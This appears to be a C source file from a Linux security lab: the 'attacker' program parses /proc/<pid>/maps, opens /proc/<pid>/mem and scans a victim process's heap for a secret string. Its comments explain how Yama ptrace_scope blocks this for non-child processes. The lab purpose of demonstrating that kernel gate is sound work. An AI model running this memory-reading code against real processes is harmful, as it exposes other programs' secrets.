/*
 * mem_peek.c — the "attacker": tries textbook file I/O on /proc/<pid>/mem.
 *
 * This is the *naive* attack: plain open() + read() on the procfs "mem"
 * file. It fails with a permission denial for a same-UID non-child under
 * the default Yama setting (ptrace_scope=1), and works only once the
 * caller has ptrace rights (root, or parent, or ptrace_scope=0).
 *
 * To locate where to read, we parse /proc/<pid>/maps and read the largest
 * anonymous rw region (the victim's 1 MiB secret buffer). Reading outside
 * a mapping yields EIO — which is why a naked `cat /proc/<pid>/mem` is
 * useless even when the open() succeeds.
 *
 * Build:  gcc -O0 -g -Wall -Wextra -o mem_peek mem_peek.c
 * Run:    ./mem_peek <pid> <secret-string>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>

#define MAX_REGION (8u << 20)      /* don't slurp more than 8 MiB */

static long find_bytes(const char *hay, size_t hl,
                       const char *needle, size_t nl) {
    size_t i;
    if (nl == 0 || nl > hl) return -1;
    for (i = 0; i + nl <= hl; i++)
        if (memcmp(hay + i, needle, nl) == 0)
            return (long)i;
    return -1;
}

/* Largest *anonymous* rw region: the victim's malloc'd buffer. */
static int find_largest_anon_rw(pid_t pid, unsigned long *out_start,
                                unsigned long *out_len) {
    char maps_path[64];
    snprintf(maps_path, sizeof maps_path, "/proc/%d/maps", pid);
    FILE *m = fopen(maps_path, "r");
    if (!m) { perror("fopen(maps)"); return -1; }

    char line[512], perms[8], dev[32], path[256];
    unsigned long start = 0, end = 0, off = 0, inode = 0;
    unsigned long best_start = 0, best_len = 0;

    while (fgets(line, sizeof line, m)) {
        path[0] = 0;
        int nf = sscanf(line, "%lx-%lx %7s %lx %31s %lu %255s",
                        &start, &end, perms, &off, dev, &inode, path);
        if (nf < 6) continue;
        if (perms[0] != 'r' || perms[1] != 'w') continue;   /* rw only     */
        int anon = (nf == 6) || strcmp(path, "[heap]") == 0;
        if (!anon) continue;                                /* file-backed */

        unsigned long len = end - start;
        if (len == 0 || len > MAX_REGION) continue;
        if (len > best_len) { best_start = start; best_len = len; }
    }
    fclose(m);
    if (best_len == 0) return -1;
    *out_start = best_start;
    *out_len   = best_len;
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <pid> <secret>\n", argv[0]);
        return 2;
    }
    pid_t  pid    = (pid_t)atoi(argv[1]);
    const char *secret = argv[2];
    size_t secret_len = strlen(secret);

    char mem_path[64];
    snprintf(mem_path, sizeof mem_path, "/proc/%d/mem", pid);

    /* ---- step 1: learn the layout (maps is world-readable) ---------- */
    unsigned long start = 0, len = 0;
    if (find_largest_anon_rw(pid, &start, &len) != 0) {
        fprintf(stderr, "[-] could not read /proc/%d/maps\n", pid);
        return 1;
    }
    fprintf(stderr, "[*] largest anonymous rw region: 0x%lx (%lu bytes)\n",
            start, len);

    /* ---- step 2: open the victim's memory ------ */
    int fd = open(mem_path, O_RDONLY);
    if (fd < 0) {
        int e = errno;
        fprintf(stderr, "[-] open(%s): %s (errno=%d)\n",
                mem_path, strerror(e), e);
        /* kernels return EACCES and/or EPERM for the same denial */
        if (e == EACCES || e == EPERM)
            fprintf(stderr,
                    "    => DENIED: the kernel refuses ptrace-style access.\n"
                    "       Same UID is NOT enough under ptrace_scope=1 for a\n"
                    "       non-child. That gate is the ENTIRE point of this lab.\n");
        return 1;
    }
    fprintf(stderr, "[+] open(%s) succeeded (caller has ptrace rights)\n",
            mem_path);

    /* ---- step 3: read the region and hunt the secret ---------------- */
    char *buf = malloc(len);
    if (!buf) { perror("malloc"); return 1; }

    ssize_t got = pread(fd, buf, len, (off_t)start);
    close(fd);
    if (got < 0) {
        fprintf(stderr, "[-] pread @0x%lx: %s\n", start, strerror(errno));
        free(buf);
        return 1;
    }

    long off = find_bytes(buf, (size_t)got, secret, secret_len);
    if (off >= 0) {
        unsigned long addr = start + (unsigned long)off;
        printf("[+] SECRET FOUND at 0x%lx:\n", addr);
        printf("    '%.32s'\n", buf + off);
        size_t w = (secret_len + 8 < 64) ? secret_len + 8 : 64;
        size_t k, j;
        for (k = 0; k < w; k += 16) {
            printf("    %06lx  ", off + k);
            for (j = 0; j < 16 && k + j < w; j++)
                printf("%02x ", (unsigned char)buf[off + k + j]);
            printf("\n");
        }
        free(buf);
        return 0;
    }

    fprintf(stderr, "[-] secret '%s' not found in region.\n", secret);
    free(buf);
    return 1;
}